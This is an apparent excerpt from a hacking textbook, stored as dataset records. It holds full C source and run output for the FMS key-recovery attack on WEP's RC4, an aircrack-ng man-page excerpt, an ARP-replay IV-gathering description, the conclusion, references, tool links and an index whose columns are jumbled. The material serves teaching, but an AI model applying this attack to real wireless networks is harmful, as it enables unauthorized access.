2\noutput − j − S[4] = key[1]\n6 − 3 − 1 = 2\n442 0x700\nAgain, the correct key byte is determined. Of course, for the sake of\ndemonstration, values for X have been strategically picked. To give you a\ntrue sense of the statistical nature of the attack against a full RC4 imple-\nmentation, the following source code has been included:\nfms.c\n#include <stdio.h>\n/* RC4 stream cipher */\nint RC4(int *IV, int *key) {\nint K[256];\nint S[256];\nint seed[16];\nint i, j, k, t;\n//Seed = IV + key;\nfor(k=0; k<3; k++)\nseed[k] = IV[k];\nfor(k=0; k<13; k++)\nseed[k+3] = key[k];\n// -= Key Scheduling Algorithm (KSA) =-\n//Initialize the arrays.\nfor(k=0; k<256; k++) {\nS[k] = k;\nK[k] = seed[k%16];\n}\nj=0;\nfor(i=0; i < 256; i++) {\nj = (j + S[i] + K[i])%256;\nt=S[i]; S[i]=S[j]; S[j]=t; // Swap(S[i], S[j]);\n}\n// First step of PRGA for first keystream byte\ni = 0;\nj = 0;\ni = i + 1;\nj = j + S[i];\nt=S[i]; S[i]=S[j]; S[j]=t; // Swap(S[i], S[j]);\nk = (S[i] + S[j])%256;\nreturn S[k];\n}\nint main(int argc, char *argv[]) {\nint K[256];\nint S[256];\nint IV[3];\nCryptology 443\nint key[13] = {1, 2, 3, 4, 5, 66, 75, 123, 99, 100, 123, 43, 213};\nint seed[16];\nint N = 256;\nint i, j, k, t, x, A;\nint keystream, keybyte;\nint max_result, max_count;\nint results[256];\nint known_j, known_S;\nif(argc < 2) {\nprintf(\"Usage: %s <keybyte to attack>\\n\", argv[0]);\nexit(0);\n}\nA = atoi(argv[1]);\nif((A > 12) || (A < 0)) {\nprintf(\"keybyte must be from 0 to 12.\\n\");\nexit(0);\n}\nfor(k=0; k < 256; k++)\nresults[k] = 0;\nIV[0] = A + 3;\nIV[1] = N - 1;\nfor(x=0; x < 256; x++) {\nIV[2] = x;\nkeystream = RC4(IV, key);\nprintf(\"Using IV: (%d, %d, %d), first keystream byte is %u\\n\",\nIV[0], IV[1], IV[2], keystream);\nprintf(\"Doing the first %d steps of KSA.. \", A+3);\n//Seed = IV + key;\nfor(k=0; k<3; k++)\nseed[k] = IV[k];\nfor(k=0; k<13; k++)\nseed[k+3] = key[k];\n// -= Key Scheduling Algorithm (KSA) =-\n//Initialize the arrays.\nfor(k=0; k<256; k++) {\nS[k] = k;\nK[k] = seed[k%16];\n}\nj=0;\nfor(i=0; i < (A + 3); i++) {\nj = (j + S[i] + K[i])%256;\nt = S[i];\n444 0x700\nS[i] = S[j];\nS[j] = t;\n}\nif(j < 2) { // If j < 2, then S[0] or S[1] have been disturbed.\nprintf(\"S[0] or S[1] have been disturbed, discarding..\\n\");\n} else {\nknown_j = j;\nknown_S = S[A+3];\nprintf(\"at KSA iteration #%d, j=%d and S[%d]=%d\\n\",\nA+3, known_j, A+3, known_S);\nkeybyte = keystream - known_j - known_S;\nwhile(keybyte < 0)\nkeybyte = keybyte + 256;\nprintf(\"key[%d] prediction = %d - %d - %d = %d\\n\",\nA, keystream, known_j, known_S, keybyte);\nresults[keybyte] = results[keybyte] + 1;\n}\n}\nmax_result = -1;\nmax_count = 0;\nfor(k=0; k < 256; k++) {\nif(max_count < results[k]) {\nmax_count = results[k];\nmax_result = k;\n}\n}\nprintf(\"\\nFrequency table for key[%d] (* = most frequent)\\n\", A);\nfor(k=0; k < 32; k++) {\nfor(i=0; i < 8; i++) {\nt = k+i*32;\nif(max_result == t)\nprintf(\"%3d %2d*| \", t, results[t]);\nelse\nprintf(\"%3d %2d | \", t, results[t]);\n}\nprintf(\"\\n\");\n}\nprintf(\"\\n[Actual Key] = (\");\nfor(k=0; k < 12; k++)\nprintf(\"%d, \",key[k]);\nprintf(\"%d)\\n\", key[12]);\nprintf(\"key[%d] is probably %d\\n\", A, max_result);\n}\nThis code performs the FMS attack on 128-bit WEP (104-bit key, 24-bit IV),\nusing every possible value of X. The key byte to attack is the only argument,\nCryptology 445\nand the key is hard-coded into the key array. The following output shows the\ncompilation and execution of the fms.c code to crack an RC4 key.\nreader@hacking:~/booksrc $ gcc -o fms fms.c\nreader@hacking:~/booksrc $ ./fms\nUsage: ./fms <keybyte to attack>\nreader@hacking:~/booksrc $ ./fms 0\nUsing IV: (3, 255, 0), first keystream byte is 7\nDoing the first 3 steps of KSA.. at KSA iteration #3, j=5 and S[3]=1\nkey[0] prediction = 7 - 5 - 1 = 1\nUsing IV: (3, 255, 1), first keystream byte is 211\nDoing the first 3 steps of KSA.. at KSA iteration #3, j=6 and S[3]=1\nkey[0] prediction = 211 - 6 - 1 = 204\nUsing IV: (3, 255, 2), first keystream byte is 241\nDoing the first 3 steps of KSA.. at KSA iteration #3, j=7 and S[3]=1\nkey[0] prediction = 241 - 7 - 1 = 233\n.:[ output trimmed ]:.\nUsing IV: (3, 255, 252), first keystream byte is 175\nDoing the first 3 steps of KSA.. S[0] or S[1] have been disturbed,\ndiscarding..\nUsing IV: (3, 255, 253), first keystream byte is 149\nDoing the first 3 steps of KSA.. at KSA iteration #3, j=2 and S[3]=1\nkey[0] prediction = 149 - 2 - 1 = 146\nUsing IV: (3, 255, 254), first keystream byte is 253\nDoing the first 3 steps of KSA.. at KSA iteration #3, j=3 and S[3]=2\nkey[0] prediction = 253 - 3 - 2 = 248\nUsing IV: (3, 255, 255), first keystream byte is 72\nDoing the first 3 steps of KSA.. at KSA iteration #3, j=4 and S[3]=1\nkey[0] prediction = 72 - 4 - 1 = 67\nFrequency table for key[0] (* = most frequent)\n0 1 | 32 3 | 64 0 | 96 1 | 128 2 | 160 0 | 192 1 | 224 3 |\n1 10*| 33 0 | 65 1 | 97 0 | 129 1 | 161 1 | 193 1 | 225 0 |\n2 0 | 34 1 | 66 0 | 98 1 | 130 1 | 162 1 | 194 1 | 226 1 |\n3 1 | 35 0 | 67 2 | 99 1 | 131 1 | 163 0 | 195 0 | 227 1 |\n4 0 | 36 0 | 68 0 | 100 1 | 132 0 | 164 0 | 196 2 | 228 0 |\n5 0 | 37 1 | 69 0 | 101 1 | 133 0 | 165 2 | 197 2 | 229 1 |\n6 0 | 38 0 | 70 1 | 102 3 | 134 2 | 166 1 | 198 1 | 230 2 |\n7 0 | 39 0 | 71 2 | 103 0 | 135 5 | 167 3 | 199 2 | 231 0 |\n8 3 | 40 0 | 72 1 | 104 0 | 136 1 | 168 0 | 200 1 | 232 1 |\n9 1 | 41 0 | 73 0 | 105 0 | 137 2 | 169 1 | 201 3 | 233 2 |\n10 1 | 42 3 | 74 1 | 106 2 | 138 0 | 170 1 | 202 3 | 234 0 |\n11 1 | 43 2 | 75 1 | 107 2 | 139 1 | 171 1 | 203 0 | 235 0 |\n12 0 | 44 1 | 76 0 | 108 0 | 140 2 | 172 1 | 204 1 | 236 1 |\n13 2 | 45 2 | 77 0 | 109 0 | 141 0 | 173 2 | 205 1 | 237 0 |\n14 0 | 46 0 | 78 2 | 110 2 | 142 2 | 174 1 | 206 0 | 238 1 |\n15 0 | 47 3 | 79 1 | 111 2 | 143 1 | 175 0 | 207 1 | 239 1 |\n16 1 | 48 1 | 80 1 | 112 0 | 144 2 | 176 0 | 208 0 | 240 0 |\n17 0 | 49 0 | 81 1 | 113 1 | 145 1 | 177 1 | 209 0 | 241 1 |\n18 1 | 50 0 | 82 0 | 114 0 | 146 4 | 178 1 | 210 1 | 242 0 |\n446 0x700\n19 2 | 51 0 | 83 0 | 115 0 | 147 1 | 179 0 | 211 1 | 243 0 |\n20 3 | 52 0 | 84 3 | 116 1 | 148 2 | 180 2 | 212 2 | 244 3 |\n21 0 | 53 0 | 85 1 | 117 2 | 149 2 | 181 1 | 213 0 | 245 1 |\n22 0 | 54 3 | 86 3 | 118 0 | 150 2 | 182 2 | 214 0 | 246 3 |\n23 2 | 55 0 | 87 0 | 119 2 | 151 2 | 183 1 | 215 1 | 247 2 |\n24 1 | 56 2 | 88 3 | 120 1 | 152 2 | 184 1 | 216 0 | 248 2 |\n25 2 | 57 2 | 89 0 | 121 1 | 153 2 | 185 0 | 217 1 | 249 3 |\n26 0 | 58 0 | 90 0 | 122 0 | 154 1 | 186 1 | 218 0 | 250 1 |\n27 0 | 59 2 | 91 1 | 123 3 | 155 2 | 187 1 | 219 1 | 251 1 |\n28 2 | 60 1 | 92 1 | 124 0 | 156 0 | 188 0 | 220 0 | 252 3 |\n29 1 | 61 1 | 93 1 | 125 0 | 157 0 | 189 0 | 221 0 | 253 1 |\n30 0 | 62 1 | 94 0 | 126 1 | 158 1 | 190 0 | 222 1 | 254 0 |\n31 0 | 63 0 | 95 1 | 127 0 | 159 0 | 191 0 | 223 0 | 255 0 |\n[Actual Key] = (1, 2, 3, 4, 5, 66, 75, 123, 99, 100, 123, 43, 213)\nkey[0] is probably 1\nreader@hacking:~/booksrc $\nreader@hacking:~/booksrc $ ./fms 12\nUsing IV: (15, 255, 0), first keystream byte is 81\nDoing the first 15 steps of KSA.. at KSA iteration #15, j=251 and S[15]=1\nkey[12] prediction = 81 - 251 - 1 = 85\nUsing IV: (15, 255, 1), first keystream byte is 80\nDoing the first 15 steps of KSA.. at KSA iteration #15, j=252 and S[15]=1\nkey[12] prediction = 80 - 252 - 1 = 83\nUsing IV: (15, 255, 2), first keystream byte is 159\nDoing the first 15 steps of KSA.. at KSA iteration #15, j=253 and S[15]=1\nkey[12] prediction = 159 - 253 - 1 = 161\n.:[ output trimmed ]:.\nUsing IV: (15, 255, 252), first keystream byte is 238\nDoing the first 15 steps of KSA.. at KSA iteration #15, j=236 and S[15]=1\nkey[12] prediction = 238 - 236 - 1 = 1\nUsing IV: (15, 255, 253), first keystream byte is 197\nDoing the first 15 steps of KSA.. at KSA iteration #15, j=236 and S[15]=1\nkey[12] prediction = 197 - 236 - 1 = 216\nUsing IV: (15, 255, 254), first keystream byte is 238\nDoing the first 15 steps of KSA.. at KSA iteration #15, j=249 and S[15]=2\nkey[12] prediction = 238 - 249 - 2 = 243\nUsing IV: (15, 255, 255), first keystream byte is 176\nDoing the first 15 steps of KSA.. at KSA iteration #15, j=250 and S[15]=1\nkey[12] prediction = 176 - 250 - 1 = 181\nFrequency table for key[12] (* = most frequent)\n0 1 | 32 0 | 64 2 | 96 0 | 128 1 | 160 1 | 192 0 | 224 2 |\n1 2 | 33 1 | 65 0 | 97 2 | 129 1 | 161 1 | 193 0 | 225 0 |\n2 0 | 34 2 | 66 2 | 98 0 | 130 2 | 162 3 | 194 2 | 226 0 |\n3 2 | 35 0 | 67 2 | 99 2 | 131 0 | 163 1 | 195 0 | 227 5 |\n4 0 | 36 0 | 68 0 | 100 1 | 132 0 | 164 0 | 196 1 | 228 1 |\n5 3 | 37 0 | 69 3 | 101 2 | 133 0 | 165 2 | 197 0 | 229 3 |\n6 1 | 38 2 | 70 2 | 102 0 | 134 0 | 166 2 | 198 0 | 230 2 |\n7 2 | 39 0 | 71 1 | 103 0 | 135 0 | 167 3 | 199 1 | 231 1 |\n8 1 | 40 0 | 72 0 | 104 1 | 136 1 | 168 2 | 200 0 | 232 0 |\nCryptology 447\n9 0 | 41 1 | 73 0 | 105 0 | 137 1 | 169 1 | 201 1 | 233 1 |\n10 2 | 42 2 | 74 0 | 106 4 | 138 2 | 170 0 | 202 1 | 234 0 |\n11 3 | 43 1 | 75 0 | 107 1 | 139 3 | 171 2 | 203 1 | 235 0 |\n12 2 | 44 0 | 76 0 | 108 2 | 140 2 | 172 0 | 204 0 | 236 1 |\n13 0 | 45 0 | 77 0 | 109 1 | 141 1 | 173 0 | 205 2 | 237 4 |\n14 1 | 46 1 | 78 1 | 110 0 | 142 3 | 174 1 | 206 0 | 238 1 |\n15 1 | 47 2 | 79 1 | 111 0 | 143 0 | 175 1 | 207 2 | 239 0 |\n16 2 | 48 0 | 80 1 | 112 1 | 144 3 | 176 0 | 208 0 | 240 0 |\n17 1 | 49 0 | 81 0 | 113 1 | 145 1 | 177 0 | 209 0 | 241 0 |\n18 0 | 50 2 | 82 0 | 114 1 | 146 0 | 178 0 | 210 1 | 242 0 |\n19 0 | 51 0 | 83 4 | 115 1 | 147 0 | 179 1 | 211 4 | 243 2 |\n20 0 | 52 1 | 84 1 | 116 4 | 148 0 | 180 1 | 212 1 | 244 1 |\n21 0 | 53 1 | 85 1 | 117 0 | 149 2 | 181 1 | 213 12*| 245 1 |\n22 1 | 54 3 | 86 0 | 118 0 | 150 1 | 182 2 | 214 3 | 246 1 |\n23 0 | 55 3 | 87 0 | 119 1 | 151 0 | 183 0 | 215 0 | 247 0 |\n24 0 | 56 1 | 88 0 | 120 0 | 152 2 | 184 0 | 216 2 | 248 0 |\n25 1 | 57 0 | 89 0 | 121 2 | 153 0 | 185 2 | 217 1 | 249 0 |\n26 1 | 58 0 | 90 1 | 122 0 | 154 1 | 186 0 | 218 1 | 250 2 |\n27 2 | 59 1 | 91 1 | 123 0 | 155 1 | 187 1 | 219 0 | 251 2 |\n28 2 | 60 2 | 92 1 | 124 1 | 156 1 | 188 1 | 220 0 | 252 0 |\n29 1 | 61 1 | 93 3 | 125 2 | 157 2 | 189 2 | 221 0 | 253 1 |\n30 0 | 62 1 | 94 0 | 126 0 | 158 1 | 190 1 | 222 1 | 254 2 |\n31 0 | 63 0 | 95 1 | 127 0 | 159 0 | 191 0 | 223 2 | 255 0 |\n[Actual Key] = (1, 2, 3, 4, 5, 66, 75, 123, 99, 100, 123, 43, 213)\nkey[12] is probably 213\nreader@hacking:~/booksrc $\nThis type of attack has been so successful that a new wireless protocol\ncalled WPA should be used if you expect any form of security. However,\nthere are still an amazing number of wireless networks only protected by\nWEP. Nowadays, there are fairly robust tools to perform WEP attacks. One\nnotable example is aircrack, which has been included with the LiveCD;\nhowever, it requires wireless hardware, which you may not have. There is\nplenty of documentation on how to use this tool, which is in constant\ndevelopment. The first manual page should get you started.\n448 0x700\nAIRCRACK-NG(1) AIRCRACK-NG(1)\nNAME\naircrack-ng is a 802.11 WEP / WPA-PSK key cracker.\nSYNOPSIS\naircrack-ng [options] <.cap / .ivs file(s)>\nDESCRIPTION\naircrack-ng is a 802.11 WEP / WPA-PSK key cracker. It implements the so-\ncalled Fluhrer - Mantin - Shamir (FMS) attack, along with some new attacks\nby a talented hacker named KoreK. When enough encrypted packets have been\ngathered, aircrack-ng can almost instantly recover the WEP key.\nOPTIONS\nCommon options:\n-a <amode>\nForce the attack mode, 1 or wep for WEP and 2 or wpa for WPA-PSK.\n-e <essid>\nSelect the target network based on the ESSID. This option is also\nrequired for WPA cracking if the SSID is cloacked.\nAgain, consult the Internet for hardware issues. This program popularized\na clever technique for gathering IVs. Waiting to gather enough IVs from\npackets would take hours, or even days. But since wireless is still a network,\nthere will be ARP traffic. Since WEP encryption doesn’t modify the size of\nthe packet, it’s easy to pick out which ones are ARP. This attack captures\nanencrypted packet that is the size of an ARP request, and then replays\nitto the network thousands of times. Each time, the packet is decrypted\nand sent to the network, and a corresponding ARP reply is sent back out.\nThese extra replies don’t harm the network; however, they do generate a\nseparate packet with a new IV. Using this technique of tickling the network,\nenough IVs to crack the WEP key can be gathered in just a few minutes.\nCryptology 449"
  },
  {
    "input": "0x800: Conclusion",
    "output": "0x800\nC O N C L U S I O N\nHacking tends to be a misunderstood topic, and the\nmedia likes to sensationalize, which only exacerbates\nthis condition. Changes in terminology have been\nmostly ineffective—what’s needed is a change in\nmind-set.Hackers are just people with innovative spirits and an in-depth\nknowledge of technology. Hackers aren’t necessarily criminals, though as\nlong as crime has the potential to pay, there will always be some criminals\nwho are hackers. There’s nothing wrong with the hacker knowledge itself,\ndespite its potential applications.\nLike it or not, vulnerabilities exist in the software and networks that the\nworld depends on from day to day. It’s simply an inevitable result of the fast\npace of software development. New software is often successful at first, even if\nthere are vulnerabilities. This success means money, which attracts criminals\nwho learn how to exploit these vulnerabilities for financial gain. This seems\nlike it would be an endless downward spiral, but fortunately, all the people\nfinding the vulnerabilities in software are not just profit-driven, malicious\ncriminals. These people are hackers, each with his or her own motives; some\nare driven by curiosity, others are paid for their work, still others just like the\nchallenge, and several are, in fact, criminals. The majority of these people"
  },
  {
    "input": "0x810 References",
    "output": "don’t have malicious intent; instead, they help vendors fix their vulnerable\nsoftware. Without hackers, the vulnerabilities and holes in software would\nremain undiscovered. Unfortunately, the legal system is slow and mostly\nignorant with regard to technology. Often, draconian laws are passed and\nexcessive sentences are given to try to scare people away from looking\nclosely. This is childish logic—discouraging hackers from exploring and\nlooking for vulnerabilities doesn’t solve anything. Convincing everyone the\nemperor is wearing fancy new clothes doesn’t change the reality that he’s\nnaked. Undiscovered vulnerabilities just lie in wait for someone much more\nmalicious than an average hacker to discover them. The danger of software\nvulnerabilities is that the payload could be anything. Replicating Internet\nworms are relatively benign when compared to the nightmare terrorism\nscenarios these laws are so afraid of. Restricting hackers with laws can\nmakethe worst-case scenarios more likely, since it leaves more undiscovered\nvulnerabilities to be exploited by those who aren’t bound by the law and\nwant to do real damage.\nSome could argue that if there weren’t hackers, there would be no\nreason to fix these undiscovered vulnerabilities. That is one perspective, but\npersonally I prefer progress over stagnation. Hackers play a very important\nrole in the co-evolution of technology. Without hackers, there would be little\nreason for computer security to improve. Besides, as long as the questions\n“Why?” and “What if?” are asked, hackers will always exist. A world without\nhackers would be a world without curiosity and innovation.\nHopefully, this book has explained some basic techniques of hacking and\nperhaps even the spirit of it. Technology is always changing and expanding,\nso there will always be new hacks. There will always be new vulnerabilities in\nsoftware, ambiguities in protocol specifications, and a myriad of other over-\nsights. The knowledge gained from this book is just a starting point. It’s up to\nyou to expand upon it by continually figuring out how things work, wondering\nabout the possibilities, and thinking of the things that the developers didn’t\nthink of. It’s up to you to make the best of these discoveries and apply this\nknowledge however you see fit. Information itself isn’t a crime.\n0x810 References\nAleph1. “Smashing the Stack for Fun and Profit.” Phrack, no. 49, online pub-\nlication at http://www.phrack.org/issues.html?issue=49&id=14#article\nBennett, C., F. Bessette, and G. Brassard. “Experimental Quantum\nCryptography.” Journal of Cryptology, vol. 5, no. 1 (1992), 3–28.\nBorisov, N., I. Goldberg, and D. Wagner. “Security of the WEP Algorithm.”\nOnline publication at http://www.isaac.cs.berkeley.edu/isaac/\nwep-faq.html\nBrassard, G. and P. Bratley. Fundamentals of Algorithmics. Englewood Cliffs, NJ:\nPrentice Hall, 1995.\n452 0x800\nCNET News. “40-Bit Crypto Proves No Problem.” Online publication at\nhttp://www.news.com/News/Item/0,4,7483,00.html\nConover, M. (Shok). “w00w00 on Heap Overflows.” Online publication at\nhttp://www.w00w00.org/files/articles/heaptut.txt\nElectronic Frontier Foundation. “Felten vs. RIAA.” Online publication at\nhttp://www.eff.org/IP/DMCA/Felten_v_RIAA\nEller, R. (caezar). “Bypassing MSB Data Filters for Buffer Overflow Exploits\non Intel Platforms.” Online publication at http://community.core-sdi\n.com/~juliano/bypass-msb.txt\nFluhrer, S., I. Mantin, and A. Shamir. “Weaknesses in the Key Scheduling\nAlgorithm of RC4.” Online publication at http://citeseer.ist.psu.edu/\nfluhrer01weaknesses.html\nGrover, L. “Quantum Mechanics Helps in Searching for a Needle in a\nHaystack.” Physical Review Letters, vol. 79, no. 2 (1997), 325–28.\nJoncheray, L. “Simple Active Attack Against TCP.” Online publication at\nhttp://www.insecure.org/stf/iphijack.txt\nLevy, S. Hackers: Heroes of the Computer Revolution. New York: Doubleday, 1984.\nMcCullagh, D. “Russian Adobe Hacker Busted,” Wired News, July 17, 2001.\nOnline publication at http://www.wired.com/news/politics/\n0,1283,45298,00.html\nThe NASM Development Team. “NASM—The Netwide Assembler\n(Manual),” version 0.98.34. Online publication at http://nasm\n.sourceforge.net\nRieck, K. “Fuzzy Fingerprints: Attacking Vulnerabilities in the Human\nBrain.” Online publication at http://freeworld.thc.org/papers/ffp.pdf\nSchneier, B. Applied Cryptography: Protocols, Algorithms, and Source Code in C,\n2nd ed. New York: John Wiley & Sons, 1996.\nScut and Team Teso. “Exploiting Format String Vulnerabilities,” version 1.2.\nAvailable online at private users’ websites.\nShor, P. “Polynomial-Time Algorithms for Prime Factorization and Discrete\nLogarithms on a Quantum Computer.” SIAM Journal of Computing, vol. 26\n(1997), 1484–509. Online publication at http://www.arxiv.org/abs/\nquant-ph/9508027\nSmith, N. “Stack Smashing Vulnerabilities in the UNIX Operating System.”\nAvailable online at private users’ websites.\nSolar Designer. “Getting Around Non-Executable Stack (and Fix).” BugTraq\npost, August 10, 1997.\nStinson, D. Cryptography: Theory and Practice. Boca Raton, FL: CRC Press, 1995.\nZwicky, E., S. Cooper, and D. Chapman. Building Internet Firewalls, 2nd ed.\nSebastopol, CA: O’Reilly, 2000.\nConclusion 453"
  },
  {
    "input": "0x820 Sources",
    "output": "0x820 Sources\npcalc\nA programmer’s calculator available from Peter Glen\nhttp://ibiblio.org/pub/Linux/apps/math/calc/pcalc-000.tar.gz\nNASM\nThe Netwide Assembler, from the NASM Development Group\nhttp://nasm.sourceforge.net\nNemesis\nA command-line packet injection tool from obecian (Mark Grimes) and\nJeff Nathan\nhttp://www.packetfactory.net/projects/nemesis\ndsniff\nA collection of network-sniffing tools from Dug Song\nhttp://monkey.org/~dugsong/dsniff\nDissembler\nA printable ASCII bytecode polymorpher from Matrix (Jose Ronnick)\nhttp://www.phiral.com\nmitm-ssh\nAn SSH man-in-the-middle tool from Claes Nyberg\nhttp://www.signedness.org/tools/mitm-ssh.tgz\nffp\nA fuzzy fingerprint–generation tool from Konrad Rieck\nhttp://freeworld.thc.org/thc-ffp\nJohn the Ripper\nA password cracker from Solar Designer\nhttp://www.openwall.com/john\n454 0x800"
  },
  {
    "input": "Index",
    "output": "I N D E X\nSymbols & Numbers Accumulator (EAX) register, 24, 346\nzeroing, 368\n& (ampersand)\nACK flag, 223\nfor address-of operator, 45\nfilter for, 260\nfor background process, 347\nactive sniffing, 239–251\n< > (angle brackets), for include\nadd instruction, 293\nfile,91\nAddress Resolution Protocol (ARP),\n= (assignment operator), 12\n219, 240\n* (asterisk), for pointers, 43\ncache poisoning, 240\n\\ (backslash), for escaped\nredirection, 240\ncharacter,180\nreply messages, 219\n{ } (curly braces), for set of\nspoofing, 243\ninstructions, 8, 9\nrequest messages, 219\n$ (dollar sign qualifier), and direct\naddress-of operator, 45, 47, 98\nparameter access, 180\naddressof.c program, 46\n== (equal to operator), 14\naddressof2.c program, 47\n! (exclamation point), 14\naddr_struct.c file, 348–349\n> (greater than operator), 14\nadministrator account, 88. See also\n>= (greater than or equal to\nroot, user\noperator), 14\nAES (Rijndael), 398\n< (less than operator), 14\nAF_INET, socket address structure\n<= (less than or equal to operator), 14\nfor, 201–202\n!= (not equal to operator), 14\naircrack, 448–449\n! (not operator), 14\nAirSnort, 439\n% (percent sign), for format\nalgorithm, efficiency of, 398\nparameter, 48\nalgorithmic run time, 397–398\n\" (quotation marks), for include\nampersand (&)\nfiles,91\nfor address-of operator, 45\n; (semicolon), for instruction end, 8\nfor background process, 347\n$1 variable, 31\namplification attacks, 257\n8-by-8 S-box, 435\nAND bitwise operation, 366\n32-bit addressing scheme, 22\nand instruction, 293\n64-bit addressing scheme, 22\nAND operator, 14–15\n404 HTTP response, 213\n< > (angle brackets), for include\nfile,91\nA\napplication layer (OSI), 196\naccept() function, 199, 206 argument vector, 59\naccess mode for file, 84 arithmetic operators, 12–14\nARP. See Address Resolution Protocol Base Pointer (EBP) register, 24, 31,\n(ARP) 70, 73, 344–345\narp_cmdline() function, 246 saving current values, 342\nARPhdr structure, 245–246 BASH shell, 133–150, 332\narp_initdata() function, 246 command substitution, 254\narp_send() function, 249 investigations with, 380–384\narpspoof.c program, 249–250, 408 for loops, 141–142\narp_validatedata() function, 246 script to send ARP replies, 243–244\narp_verbose() function, 246 BB84, 396\narrays in C, 38 bc calculator program, 30\nartistic expression, programming as, 2 beauty, in mathematics, 3\nASCII, 33–34 Bennett, Charles, 396\nfunction for converting to Berkeley Packet Filter (BPF), 259\ninteger,59 big-endian byte order, 202\nfor IP address, conversion, 203 big-oh notation, 398\nASLR, 379–380, 385, 388 bind call, host_addr structure for, 205\naslr_demo.c program, 380 bind() function, 199\naslr_execl.c program, 389 bind_port.c program, 303–304\naslr_execl_exploit.c program, bind_port.s program, 306–307\n390–391 bind_shell.s program, 312–314\nassembler, 7 bind_shell1.s program, 308\nassembly language, 7, 22, 25–37 /bin/sh, 359\nGDB examine command to display system call to execute, 295\ninstructions, 30 birthday paradox, 437\nif-then-else structure in, 32 bitwise operations, 84\nLinux system calls in, 284–286 bitwise.c program, 84–85\nfor shellcode, 282–286 block cipher, 398\nsyntax, 22 Blowfish, 398\nassignment operator (=), 12 Bluesmack, 256\nasterisk (*), for pointers, 43 Bluetooth protocol, 256\nasymmetric encryption, 400–405 bootable LiveCD. See LiveCD\nasymptotic notation, 398 botnet, 258\nAT&T syntax for assembly bots, 258\nlanguage,22 BPF (Berkeley Packet Filter), 259\natoi() function, 59 Brassard, Gilles, 396\nauth_overflow.c program, 122–125 breakpoint, 24, 27, 39, 342, 343\nauth_overflow2.c program, 126–133 broadcast address, for amplification\nattacks, 257\nB brute-force attacks, 436–437\nexhaustive, 422–423\nbackslash (\\), for escaped\nbss segment, 69, 77\ncharacter,180\nfor C variable storage, 75\nbacktrace\nbt command, 40\nof nested function calls, 66\nbuffer overflows, 119–133, 251\nof stack, 40, 61, 274\ncommand substitution and Perl to\nbandwidth, ping flood to\ngenerate, 134–135\nconsume,257\nin memory segments, 150–167\nBase (EBX) register, 24, 344–345\nnotesearch.c program vulner-\nsaving current values, 342\nability to, 137–142\nstack-based vulnerabilities, 122–133\n456 INDEX\nbuffer overrun, 119 close() function, file descriptor for, 82\nbuffers, 38 closed ports, response with SYN/ACK\nprogram restrictions on, 363–376 packets, 268\nbuildarp() function, 246 cmp operation, 26, 32, 310, 311\nbyte, 21 code segment, 69\nbyte counter, incrementing, 177 CodeRed worm, 117, 319\nbyte order of architecture, 30 command line, Perl to execute\nconversion, 238 instructions, 133\ncommand prompt, indicator of back-\nC ground jobs, 332\ncommand-line arguments, 58–61\nC compilers, 19\ncommandline.c program, 58–59\nfree, 20\ncommands\nvariable data types and, 58\nrunning single as root user, 88\nC programming language\nsubstitution and Perl to generate\naddress-of operator, 45\nbuffer overflows, 134–135\narithmetic operators shorthand, 13\ncomments, in C program, 19\nvs. assembly language, 282\ncomparison operators, 14–15\nBoolean operations, 15\ncompiled code, 20\ncomments, 19\ncompiler, 7\ncontrol structures, 309–314\ncomputational power, vs. storage\nfile access in, 81–86\nspace, 424\nfunctions in, 16\ncomputational security, 396\nmemory segments, 75–77\nconditional probability, 114\nprogrammer responsibility for data\nconditional statements,\nintegrity, 119\nvariablesin,14\ncall instruction, 287 confusion, 399\nnull bytes from, 290\nconnect() function, 199, 213, 314\ncallback function, 235\nconnect-back shellcode, 314–318\ncarriage return, for line termination\nconnectback-shell.s program,\nin HTTP, 209\n314–315\ncaught_packet() function, 236, 237 connectivity, ICMP to test for, 221\nCD with book. See LiveCD\nconstants, 12\ncdq instruction, 302 constructors (.ctors), table\nchar data type, 12, 43 sectionsfor, 184–188\ncharacter array (C), 38\nconvert.c program, 59–60\nchar_array executable binary, 38 Copyright Act, 118\nchar_array.c program, 38\ncore dump, 289\ncheck_authentication() function, Counter (ECX) register, 24\n122,125\ncountermeasures\nstack frame for, 128–129\nfor attack detections, 320\nchild process, spawning root shell\nbuffer restrictions, 363–376\nwith, 346\nhardening, 376\nchmod command, 88 log files and, 334–336\nchown command, 90 nonexecutable stack, 376–379\nchsh command, 89 overlooking obvious, 336–347\ncleanup() function, 184 system daemons, 321–328\nclient_addr_ptr, 348, 349\ntools, 328–333\nand crash, 353\ncrackers, 3\nINDEX 457\ncrash, 61, 128 stack variable, 76\nfrom buffer overflow, 120 variables, 12\nand client_addr_ptr, 353 decode_ethernet() function, 237\nby DoS attacks, 251 decode_ip() function, 237\nfrom out-of-bound memory decode_sniff.c file, 235–239\naddresses, 60 decode_tcp() function, 236, 237\nCRC32 (cyclic redundancy checksum) decoherence, 399\nfunction, 434 default gateway, ARP redirection\ncriminal activity, 451–452 and,241\ncrypt() function, 153, 418 Denial of Service (DoS), 251–258\nsalt values, 423 amplification attacks, 257\ncryptanalysis, 393 distributed DoS flooding, 258\ncrypt_crack.c program, 420 ping flooding, 257\ncryptography, 393 ping of death, 256\nlaws restricting, 3 SYN flooding, 252–256\ncryptology, 393 teardrop, 256\ncrypt_test.c program, 418 dereference operator, 47\n.ctors (constructors), table sections loading address of, 297\nfor, 184–188 DES, 398\ncurly braces ({ }), for set of Destination Index (EDI) register, 24\ninstructions, 8, 9 destructors (.dtors)\ncurrent_time variable, 97 displaying contents, 185\ncustom signal handlers, 322 overwriting section with address of\ncut command, 143–144 injected shellcode, 190\ncyclic redundancy checksum table sections for, 184–188\n(CRC32) function, 434 Deutsch, Peter, 2\nCynosure, 118 dictionary attacks, 419–422\ndictionary tables, IV-based\ndecryption, 438\nD\ndiffusion, 399\ndaemon() function, 321 Digital Millennium Copyright Act\ndaemons, 321\n(DCMA) of 1998, 3\nData (EDX) register, 24, 361 direct parameter access, 180–182\ndata integrity, programmer responsi- directory, for include files, 91\nbility for, 119 Dissembler, 454\ndata segment, 69 distributed DoS flooding, 258\nfor C variable storage, 75 division, remainder after, 12\ndata types, of variables, 12 DNS (Domain Name Service), 210\ndatafile buffer, 151–152 dollar sign qualifier ($), and direct\ndatagram socket, 198 parameter access, 180\ndata-link layer (OSI), 196, 197 DoS. See Denial of Service (DoS)\nfor web browser, 217, 218–219 dotted-number notation, 203\ndatatype_sizes.c program, 42–43 double word (DWORD), 29\nDCMA (Digital Millennium Copy- converting to quadword, 302\nright Act) of 1998, 3 drop_privs.c program, 300\ndebuggers, 23–24 dsniff program, 226, 249, 454\ndeclaring .dtors (destructors)\ndestructor function, 184 displaying contents, 185\nfunctions with data type of return overwriting section with address 